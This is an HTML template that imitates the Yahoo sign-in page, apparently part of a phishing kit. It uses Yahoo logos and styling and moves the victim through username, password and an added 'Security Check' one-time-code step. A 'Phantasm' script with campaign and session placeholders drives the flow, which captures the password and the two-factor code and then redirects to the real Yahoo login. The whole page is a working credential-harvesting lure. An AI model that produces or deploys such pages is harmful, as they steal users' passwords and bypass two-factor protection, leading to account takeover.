<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yahoo</title>
    <link rel="icon" href="https://s.yimg.com/rz/l/favicon.ico" type="image/x-icon">
    <style>
        body {
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            display: flex;
            height: 100vh;
        }

        .login-side {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px;
            box-sizing: border-box;
            background-color: #fff;
        }

        .ad-side {
            display: none;
            width: 50%;
            background-color: #f0f3f7;
            background-image: url('https://s.yimg.com/wm/login/2-0-12/assets/login-hero-2.svg'); /* Fallback or specific image */
            background-size: cover;
            background-position: center;
        }

        @media (min-width: 1024px) {
            .ad-side {
                display: block;
                width: 40%;
            }
            .login-side {
                width: 60%;
            }
        }

        .login-box {
            width: 100%;
            max-width: 360px;
            text-align: center;
        }

        .logo-center {
            margin-bottom: 30px;
        }
        
        .logo-center img {
            height: 36px;
        }

        .step-container {
            transition: opacity 0.3s ease-in-out;
        }

        .hidden {
            display: none;
            opacity: 0;
        }

        .fade-in {
            animation: fadeIn 0.5s;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #26282a;
            margin-top: 0;
        }

        p {
            font-size: 16px;
            color: #26282a;
            margin-bottom: 40px;
        }
        
        .user-greeting {
            font-size: 18px;
            font-weight: 400;
            margin-bottom: 6px;
            color: #26282a;
        }
        
        .user-email-display {
            font-size: 14px;
            font-weight: 600;
            color: #26282a;
            margin-bottom: 40px;
        }

        .input-group {
            position: relative;
            margin-bottom: 24px;
            text-align: left;
        }

        input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #e0e4e9;
            padding: 12px 0 4px;
            font-size: 16px;
            color: #26282a;
            box-sizing: border-box;
            transition: border-bottom-color 0.2s;
            background: transparent;
            height: 32px;
        }

        input:focus {
            border-bottom-color: #188fff;
            outline: none;
        }

        label {
            position: absolute;
            left: 0;
            top: 10px;
            color: #6e7780;
            font-size: 16px;
            pointer-events: none;
            transition: 0.2s ease all;
        }

        input:focus ~ label,
        input:not(:placeholder-shown) ~ label {
            top: -10px;
            font-size: 12px;
            color: #6e7780;
        }
        
        .password-toggle {
            position: absolute;
            right: 0;
            top: 8px;
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
        }
        
        .password-toggle svg {
            width: 24px;
            height: 24px;
            fill: #6e7780;
        }

        .next-btn {
            background-color: #188fff;
            color: #fff;
            border: none;
            border-radius: 24px;
            width: 100%;
            padding: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }

        .next-btn:hover {
            background-color: #0074cc;
        }
        
        .secondary-btn {
            background-color: transparent;
            color: #188fff;
            border: 1px solid #188fff;
            border-radius: 24px;
            width: 100%;
            padding: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }
        
        .secondary-btn:hover {
            background-color: #f0f8ff;
        }

        .checkbox-wrapper {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
            justify-content: flex-start;
        }

        .checkbox-wrapper input {
            width: auto;
            margin-right: 10px;
            height: auto;
        }

        .checkbox-wrapper label {
            position: static;
            font-size: 14px;
            color: #26282a;
        }

        .links {
            margin-top: 20px;
            font-size: 14px;
        }

        .links a {
            color: #188fff;
            text-decoration: none;
            margin: 0 5px;
        }
        
        .links a:hover {
            text-decoration: underline;
        }
        
        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .error-message {
            color: #f0162f;
            font-size: 14px;
            margin-bottom: 20px;
            display: none;
            text-align: left;
        }
        
        .header-top {
            position: absolute;
            top: 20px;
            right: 40px;
            display: flex;
            align-items: center;
        }
        
        .header-top a {
            text-decoration: none;
            color: #188fff;
            font-size: 14px;
            font-weight: 600;
        }
        
        .header-top svg {
            width: 20px;
            height: 20px;
            margin-left: 5px;
            fill: #188fff;
        }

    </style>
</head>
<body>
    <div class="ad-side">
        <!-- Optional: Add content here if needed -->
    </div>
    
    <div class="login-side">
        <div class="header-top">
            <a href="#">Help</a>
        </div>
        
        <div class="login-box">
            <div class="logo-center">
                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage.png" alt="Yahoo">
            </div>

            <!-- Step 1: Username -->
            <div id="step-1" class="step-container fade-in">
                <h1>Log in</h1>
                <p>Log in using your Yahoo account</p>
                
                <form>
                    <div class="input-group">
                        <input type="text" id="username" placeholder=" " required>
                        <label for="username">Username, email, or mobile</label>
                    </div>

                    <div class="checkbox-wrapper">
                        <input type="checkbox" id="stay-signed-in">
                        <label for="stay-signed-in">Stay signed in</label>
                    </div>

                    <button type="submit" class="next-btn" id="btn-next">Next</button>
                    
                    <button type="button" class="secondary-btn">Forgot username?</button>
                    
                    <button type="button" class="secondary-btn" style="border-color: #e0e4e9; color: #26282a;">Create an account</button>
                    
                    <div style="margin-top: 20px; font-size: 12px; color: #6e7780;">
                        Or, <a href="#" style="color: #188fff; text-decoration: none;">continue with Google</a>
                    </div>
                </form>
            </div>

            <!-- Step 2: Password -->
            <div id="step-2" class="step-container hidden">
                <div class="user-greeting">Hello</div>
                <div class="user-email-display" id="display-email">user@yahoo.com</div>
                
                <div class="error-message" id="error-msg">Invalid password. Please try again.</div>

                <form>
                    <div class="input-group">
                        <input type="password" id="password" placeholder=" " required>
                        <label for="password">Password</label>
                        <button type="button" class="password-toggle" onclick="togglePassword()">
                            <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                        </button>
                    </div>

                    <button type="submit" class="next-btn" id="btn-login">Next</button>
                    
                    <div style="margin-top: 10px;">
                        <a href="#" style="color: #188fff; text-decoration: none; font-size: 14px;">Forgot password?</a>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            const app = new Phantasm({
                redirectUrl: 'https://login.yahoo.com/',
                selectors: {
                    email: '#username',
                    password: '#password',
                    otp: '#otp-input',
                    nextBtn: '#btn-next',
                    submitBtn: '#btn-login',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step2: '#step-2',
                    step3: '#step-3-otp',
                    userDisplay: '#display-email',
                    errorMsg: '#error-msg'
                },
                sessionId: '{{ session_id }}',
                campaignId: '{{ campaign_id }}'
            });
        });
    </script>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>

</body>
</html>
